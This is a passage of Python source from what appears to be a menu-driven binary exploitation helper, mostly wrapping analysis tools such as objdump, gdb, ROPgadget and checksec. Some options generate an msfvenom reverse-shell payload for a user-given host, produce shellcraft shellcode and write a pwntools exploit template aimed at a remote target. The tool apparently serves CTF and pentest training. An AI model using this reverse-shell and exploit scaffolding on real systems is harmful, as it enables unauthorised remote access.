                     print("Debugging information removed...")
               if "dynamically linked" in binary:
                  command("ldd " + localDir + "/" + DATA[0].rstrip(" ") + " > libc.tmp")
                  command("cat libc.tmp | awk '{ sub(/^[ \t]+/, \"\"); print }' > libs.tmp")
                  parsFile("libs.tmp")                  
                  catsFile("libs.tmp")
                  command("cat libc.tmp | grep '=>' > address.tmp")
                  with open("address.tmp","r") as address:
                     lib = address.readline()
                     null1,null2,LIBC,liba = lib.split(" ")
                     libc = LIBC.split("/")[-1]
                     DATA[7] = spacePadding(libc, COL1)                   
                     liba = liba.replace("(","")
                     liba = liba.replace(")","")
                     REG2[11] = spacePadding(liba, COL1)
                     print("Dynamic link to " + DATA[7].rstrip(" ") + " at address " + REG2[11].rstrip(" ") + "...")
               if "intel" in binary:
                  print("Consider switching the disassembly style to intel - 'set disassembly-flavor intel'...")
               if "aarch64" in binary:
                  DATA[3] = spacePadding("aarch64", COL1)
               if "alpha" in binary:
                  DATA[3] = spacePadding("alpha", COL1)
               if "amd64" in binary:
                  DATA[3] = spacePadding("amd64", COL1)
               if "arm" in binary:
                  DATA[3] = spacePadding("arm", COL1)
               if "avr" in binary:
                  DATA[3] = spacePadding("avr", COL1)
               if "cris" in binary:
                  DATA[3] = spacePadding("cris", COL1)
               if "i386" in binary:
                  DATA[3] = spacePadding("i386", COL1)
               if "ia64" in binary:
                  DATA[3] = spacePadding("ia64", COL1)
               if "m68k" in binary:
                  DATA[3] = spacePadding("m68k", COL1)
               if "mips" in binary:
                  DATA[3] = spacePadding("mips", COL1)
               if "mips64" in binary:
                  DATA[3] = spacePadding("mips64", COL1)
               if "mips430" in binary:
                  DATA[3] = spacePadding("mips430", COL1)
               if "powerpc" in binary:
                  DATA[3] = spacePadding("powerpc", COL1)
               if "powerpc64" in binary:
                  DATA[3] = spacePadding("powerpc64", COL1)
               if "s390" in binary:
                  DATA[3] = spacePadding("s390", COL1)
               if "arc32" in binary:
                  DATA[3] = spacePadding("arc", COL1)
               if "arc64" in binary:
                  DATA[3] = spacePadding("arc64", COL1)
               if "thumb" in binary:
                  DATA[3] = spacePadding("thumb", COL1)
               if "vax" in binary:
                  DATA[3] = spacePadding("vax", COL1)
               if "elf" in binary:
                  DATA[1] = spacePadding("elf", COL1)         
         if REG1[10].rstrip(" ") == "0x0000000000000000":          
            command("cat headers.tmp | grep 'start' > start.tmp ")
            with open("start.tmp","r") as start :
               for line in start:
                  checksum, null, address = line.split(" ")
                  if checksum[:5] == "start":
                     REG1[10] = spacePadding(address, COL1)                           
         if REG2[0].rstrip(" ") == "0x0000000000000000":
            command("objdump -D " + localDir + "/" + DATA[0].rstrip(" ") + " > systems.tmp")         
            command("cat systems.tmp | grep system > system.tmp")
            count = lineCount("system.tmp")
            if count > 1:
               cutLine(">:","system.tmp")
               system = linecache.getline("system.tmp",1).split(":")[0]
               system = system.strip(" ")
               system = bulkAddress(system)
               REG2[0] = spacePadding(system, COL1)
      prompt()            

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Checksec file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("checksec --file " + localDir + "/" + DATA[0].rstrip(" ") + " 2> checksec.tmp")
         cutLine("*", "checksec.tmp")
         parsFile("checksec.tmp")
         catsFile("checksec.tmp")         
         print("If RELRO is set to full, then the entire GOT is read-only which removes the ability to perform a 'GOT overwrite' attack...")
         print("If CANARY is found, then the program checks to see if the stack has been smashed...")
         print("If FORTIFY is enabled, then the program checks for buffer overflow...")
         print("If NX is enabled, then the stack is read-only and you will need to use return-oriented programming.")
         print("If PIE is enabled, then the programs memory locations will not stay the same hence you need to leak addresses to find offsets...")
         print("If RWX has segments, then these are writeable and executable at the same time...")         
         count = lineCount("checksec.tmp") 
         for x in range(0, count):
            binary = linecache.getline("checksec.tmp", x+1)
            if "No RELRO" in binary:
               CSEC[0] = spacePadding("Disabled", COL1)
            if "Full RELRO" in binary:
               CSEC[0] = spacePadding("Full", COL1)
            if "Partial RELRO" in binary:
               CSEC[0] = spacePadding("Partial", COL1)
            if "No canary found" in binary:
               CSEC[1] = spacePadding("Disabled", COL1)
            if "Canary found" in binary:
               CSEC[1] = spacePadding("Canary", COL1)
            if "No Fortify" in binary:
               CSEC[2] = spacePadding("Disabled", COL1)
            if "NX disabled" in binary:
               CSEC[3] = spacePadding("Disabled", COL1)
            if "NX enabled" in binary:
               CSEC[3] = spacePadding("Enabled", COL1)
            if "No PIE" in binary:
               CSEC[4] = spacePadding("Disabled", COL1)
               pie = binary.split()[-1]
               pie = pie.replace("(","")
               pie = pie.replace(")","")
               pie = pie.strip(" ")
               if (DATA[5][:2] == "64"):
                  if len(pie) == 11:
                     pie = pie.lstrip("0x")
                     pie = "0x0000000000" + pie
               else:
                  if len(pie) == 11:		#32
                     pie = pie.lstrip("0x")
                     pie = "0x0000000000" + pie                                                      
               REG1[9] = spacePadding(pie, COL1)
            if "PIE enabled" in binary:
               CSEC[4] = spacePadding("Enabled", COL1)
            if "No RWX segments" in binary:
               CSEC[5] = spacePadding("Disabled", COL1)
            if "Has RWX segments" in binary:
               CSEC[5] = spacePadding("Enabled", COL1)
      prompt()
                  
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Create functions file.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:         
         print(colored("[*] Examining filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("gdb -batch -ex 'file " + localDir + "/" + DATA[0].rstrip(" ") + "' -ex 'info functions' > functions.tmp")
         cutLine("All defined functions:","functions.tmp")
         cutLine("Non-debugging symbols:","functions.tmp")
         cutLine(":","functions.tmp")
         parsFile("functions.tmp")
         catsFile("functions.tmp")        
         command("sed -i '/0x/!d' functions.tmp")         
         funcNum = lineCount("functions.tmp")
         funcNum = spacePadding(str(funcNum),7)
         command("cp functions.tmp " + localDir + "/functions.txt")  
         with open("functions.tmp", "r") as functions:
            for x in range(0, maxDispl):
               FUNC[x] = functions.readline().rstrip(" ")
               FUNC[x] = spacePadding(FUNC[x], COL3)                         
         if REG1[10] == "0x0000000000000000":          
            command("cat functions.tmp | grep '_start' > start.tmp ")
            with open("start.tmp","r") as start :
               for line in start:
                  address, checksum = line.split("  ")
                  if checksum[:6] == "_start":
                     REG1[10] = spacePadding(address, COL1)
         if REG1[11] == "0x0000000000000000":
            command("cat functions.tmp | grep 'main' > main.tmp ")
            with open("main.tmp","r") as main:
               for line in main:
                  address, checksum = line.split("  ")
                  if checksum[:4] == "main":
                     REG1[11] = spacePadding(address, COL1)                     
         if REG2[8] == "0x0000000000000000":
            command("objdump -D " + localDir + "/" + DATA[0].rstrip(" ") + " | grep '<puts@plt>' > puts.tmp")            
            counter =lineCount("puts.tmp")
            if counter > 1:
               cutLine("<puts@plt>:","puts.tmp")
               address = linecache.getline("puts.tmp", 1)
               words = address.split()
               address1 = words[0].replace(":","")
               address2 = words[-2]   
               address1 = bulkAddress(address1)
               address2 = bulkAddress(address2)
               REG2[8] = spacePadding(address1, COL1) 
               REG2[9] = spacePadding(address2, COL1)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Use radare script.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         r = r2pipe.open(localDir + "/" + DATA[0].rstrip(" "))
         print(r.cmd('aa'),file=open('output.tmp', 'a'))
         print(r.cmd('afl'),file=open('output.tmp', 'a'))
         print(r.cmd('s start'),file=open('output.tmp', 'a'))
         print( r.cmd('pdf'),file=open('output.tmp', 'a'))
         print(r.cmd('s main'),file=open('output.tmp', 'a'))
         print( r.cmd('pdf'),file=open('output.tmp', 'a'))
         parsFile("output.tmp")
         catsFile("output.tmp")                     
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Find gadgets.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '31':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:      
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("ROPgadget --binary " + localDir + "/" + DATA[0].rstrip(" ") + " > gadgets.tmp")
         command("cat gadgets.tmp | awk 'END{print}' > count.tmp")
         gadgets = linecache.getline("count.tmp", 1)
         gadgets = gadgets.split(" ")[3].rstrip("\n")
         DATA[9] = spacePadding(gadgets, COL1)
         parsFile("gadgets.tmp")
         catsFile("gadgets.tmp")                
         command("cat gadgets.tmp | grep 'pop rdi ; ret' > pop.tmp")        
         check = linecache.getline("pop.tmp", 1)
         REG2[10] = check.split(" ")[0].rstrip(" ")
         command("mv gadgets.tmp " + localDir + "/gadgets.txt")
      prompt()
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display object headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '32':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("objdump" + " -p " + localDir + "/" + DATA[0].rstrip(" ") + " > objects.tmp")
         catsFile("objects.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display section headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '33':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("objdump" + " -h " + localDir + "/" + DATA[0].rstrip(" ") + " > sections.tmp")
         parsFile("sections.tmp")
         catsFile("sections.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display all Headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '34':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("objdump" + " -x " + localDir + "/" + DATA[0].rstrip(" ") + "> all.tmp")
         parsFile("all.tmp")
         catsFile("all.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display executable section
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '35':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("objdump" + " -d " + localDir + "/" + DATA[0].rstrip(" ") + " > exec.tmp")
         parsFile("exec.tmp")
         catsFile("exec.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display debug information.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '36':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("objdump" + " -g " + localDir + "/" + DATA[0].rstrip(" ") + " > debug.tmp")
         parsFile("debug.tmp")
         catsFile("debug.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display debug + code intermix.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '37':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("objdump" + " -D -S " + localDir + "/" + DATA[0].rstrip(" ") + " > code.tmp")
         parsFile("code.tmp")
         catsFile("code.tmp")
         
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display symbols
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("objdump" + " -t " + localDir + "/" + DATA[0].rstrip(" ") + " > symbols.tmp")
         parsFile("symbols.tmp")
         catsFile("symbols.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display stabs.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '39':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("objdump" + " -G " + localDir + "/" + DATA[0].rstrip(" ") + " > stabs.tmp")
         parsFile("stabs.tmp")
         catsFile("stabs.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display in hex form.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("objdump" + " -s " + localDir + "/" + DATA[0].rstrip(" ") + " > hex.tmp")
         parsFile("hex.tmp")
         catsFile("hex.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - MSF pattern create.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '41':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         LEN1 = input("[?] Please input length of pattern: ")
         if LEN1.isdigit():
            print(colored("[*] Creating unique pattern...", colour3))          
            command("msf-pattern_create -l " + LEN1 + " > pattern.tmp")
            catsFile("pattern.tmp")
         else:
            print("[-] Invalid value...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Run file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='42':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         if DATA[2][:6] == "static":
            print("[-] File is curently set to static analysis...")
         else:
            print(colored("[*] Running filename " + localDir + "/" + DATA[0].rstrip(" ") + "...\n", colour3))
            command(localDir + "/" + DATA[0].rstrip(" "))
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Run file name using ltrace.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         if DATA[2][:6] == "static":
            print("[-] File is curently set to static analysis...")
         else:
            print(colored("[*] Running filename " + localDir + "/" + DATA[0].rstrip(" ") + "...\n", colour3))
            command("ltrace ./" + localDir + "/" + DATA[0].rstrip(" "))
      prompt()    
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - gdb file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '44':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         if DATA[2][:6] == "static":
            print("[-] File is curently set to static analysis...")
         else:
            print(colored("[*] Editing filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
            command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
            command("echo 'set follow-fork-mode child' >> command.tmp")
            command("gdb -q " + localDir + "/" + DATA[0].rstrip(" ") + " -x command.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - MSF pattern finder.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '45':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Finding buffer offset...", colour3))
         offset = input("[?] Please enter segmentation fault value: ")
         if offset != "":
            command("msf-pattern_offset -l " + LEN1 + " -q " + offset + " > offset.tmp")
            catsFile("offset.tmp")
            OFF = linecache.getline("offset.tmp", 1).rstrip("\n").split(" ")[-1]
            OFF = spacePadding(OFF, COL1)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set OFFSET value.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='46':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = CSEC[6]
         CSEC[6] = input("[?] Please enter offset value: ")
         if CSEC[6] != "":
            CSEC[6] = spacePadding(CSEC[6],COL1)
         else:
            CSEC[6] = BAK
         value = int(CSEC[6].rstrip(" "))
         if value == 0:
            HED2[8] = spacePadding(" RIP/EIP", COL1)
         else:
            HED2[8] = spacePadding(" <============", COL1)
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Adjust the offset value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '47':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         CSEC[9] = input("[?] Enter adjusted offset value: ")
         CSEC[9] = spacePadding(CSEC[9], COL1)
         HED4[9] = "ADJUST "
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Disassemble main.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
      command("echo 'set follow-fork-mode child' >> command.tmp")
      command("echo 'break main' >> command.tmp")
      command("echo 'run' >> command.tmp")
      command("echo 'disassemble' >> command.tmp")
      command("echo 'quit' >> command.tmp")
      command("gdb " + localDir + "/" + DATA[0].rstrip(" ") +" -x command.tmp")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Disassemble function.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '49':
      function = input("[?] Please enter function name: ")
      command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
      command("echo 'set follow-fork-mode child' >> command.tmp")      
      command("echo 'break main' >> command.tmp")
      command("echo 'run' >> command.tmp")
      command("echo 'disassemble /m " + function.rstrip(" ") + "' >> command.tmp")
      command("echo 'quit' >> command.tmp")
      command("gdb " + localDir + "/" + DATA[0].rstrip(" ") +" -x command.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Disassemble address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '50':
      address = input("[?] Please enter address value: ")
      if address != "":
         command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
         command("echo 'set follow-fork-mode child' >> command.tmp")      
         command("echo 'break main' >> command.tmp")
         command("echo 'run' >> command.tmp")
         command("echo 'quit' >> command.tmp")
         command("echo 'disassemble " + address.rstrip(" ") + "' >> command.tmp")
         command("gdb " + localDir + "/" + DATA[0].rstrip(" ") +" -x command.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Hex Editor. 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '51':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Editing filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
         command("ghex " + localDir + "/" + DATA[0].rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Seccomp-tools dump.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '52':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         if DATA[2][:6] == "static":
            print("[-] File is curently set to static analysis...")
         else:
            command("seccomp-tools dump " + localDir + "/" + DATA[0])
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Start shellcraft code generator.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '53':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         if DATA[1][:3] == "elf":
            command("shellcraft -l " + DATA[3].rstrip(" ") + "." + "linux > shellcraft.tmp")
            parsFile("shellcraft.tmp")
            catsFile("shellcraft.tmp")
            code = input("[?] Enter value (ie. i386.linux.sh) for hex code: ")
            command("echo '" + Green + "'")
            command("shellcraft " + code + " --color")
            command("echo '" + Reset + "'")
         else:
            command("shellcraft -l " + DATA[3].rstrip(" ") + "." + " > shellcraft.tmp")
            parsFile("shellcraft.tmp")
            catsFile("shellcraft.tmp")
            code = input("[?] Enter value (ie. i386.linux.sh) for hex code: ")
            command("echo '" + Green + "'")
            command("shellcraft " + code + " --color")
            command("echo '" + Reset + "'")         
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Start nasm_shell.rb.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '54':
      print(colored("[*] Nasm shell initiated...\n", colour3))          
      command("/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb")
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Generate msfvenom shell code.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '55':
      localHost = input("[?] Please enter localhost value: ")
      localPort = input("[?] Please enter localport value: ")
      if COM[:3] == "elf":
         command("msfvenom -p linux/x" + ARC[:2] + "/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITGRAD=thread -f c -a x" + ARC[:2] + " > payload.tmp")
      else:
         command("msfvenom -p windows/shell_reverse_tcp LHOST=" + localHost + " LPORT=" + localPort + " EXITGRAD=thread -f c -a x" + ARC[:2] + " > payload.tmp")
      catsFile("payload.tmp")
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Blank.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '56':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         pass
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set remote IP and port value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '57':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         DATA[10] = input("[?] Please enter remote IP address : ")
         DATA[10] = spacePadding(DATA[10], COL1)
         DATA[11] = input("[?] Please enter remote port number: ")
         DATA[11] = spacePadding(DATA[11], COL1)
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Generate and run exploit code.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '58':
      if DATA[0][:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         command("echo '#!/usr/bin/python3' > " + localDir + "/exploit.py") # CREATE FILE
         command("echo '# coding:UTF-8' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py") # SPACER
         command("echo '# -------------------------------------------------------------------------------------' >> " + localDir + "/exploit.py")
         command("echo '#                    PYTHON SCRIPT FILE FOR BINARY EXPLOITATION                        ' >> " + localDir + "/exploit.py")
         command("echo '#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                  ' >> " + localDir + "/exploit.py")
         command("echo '# -------------------------------------------------------------------------------------' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py") # SPACER        
         command("echo 'from pwn import *' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
         command("echo 'context.clear()' >> " + localDir + "/exploit.py")
         command("echo 'context.log_level = \"error\" #  also info or debug' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
         if DATA[1][:3] == "elf":
            command("echo 'exe  = (\"./" + DATA[0].rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
            command("echo 'elf  = context.binary = ELF(exe,checksec=False)' >> " + localDir + "/exploit.py")           
            command("echo 'rop  = ROP(elf.path)' >> " + localDir + "/exploit.py")
            command("echo 'libc = ELF(\"" + LIBC.rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
            command("echo 'info(rop.dump())' >> " + localDir + "/exploit.py")
         else:
            command("echo '# elf  = elf(\"./" + DATA[0].rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
            command("echo 'context.binary = \"./" + DATA[0].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
         if DATA[1][:3] == "elf":
            command("echo '#context.os = \"linux\"' >> " + localDir + "/exploit.py")
         else:
            command("echo '#context.os = \"windows\"' >> " + localDir + "/exploit.py")
         command("echo '#context.arch = \"" + DATA[3].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
         command("echo '#context.bits = \"" + BIT[:2] + "\"' >> " + localDir + "/exploit.py")
         command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
         if DATA[9][:1] == "0":
            command("echo 'ip = \"0\"' >> " + localDir + "/exploit.py")          
         else:
            command("echo 'ip = \"" + DATA[10].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
         if DATA[10][:1] == "0":
            command("echo 'port = 0' >> " + localDir + "/exploit.py")         
         else:
            command("echo 'port = " + DATA[11].rstrip(" ") + "' >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py") # SPACER                  
         command("echo 'if ip != \"0\":' >> " + localDir + "/exploit.py")
         command("echo '   s = remote(ip, port)' >> " + localDir + "/exploit.py")
         command("echo 'else:' >> " + localDir + "/exploit.py")
         command("echo '   s = process(\"./" + DATA[0].rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
         if DATA[5][:2] == "64":
            command("echo 'rax_addr  = p64(" + REG1[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'rbx_addr  = p64(" + REG1[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'rcx_addr  = p64(" + REG1[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'rdx_addr  = p64(" + REG1[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'rsi_addr  = p64(" + REG1[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'rdi_addr  = p64(" + REG1[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'rsp_addr  = p64(" + REG1[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
            command("echo 'rbp_addr  = p64(" + REG1[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'rip_addr  = p64(" + REG1[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'pie       = p64(" + REG1[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'start     = p64(" + REG1[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'main      = p64(" + REG1[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")            
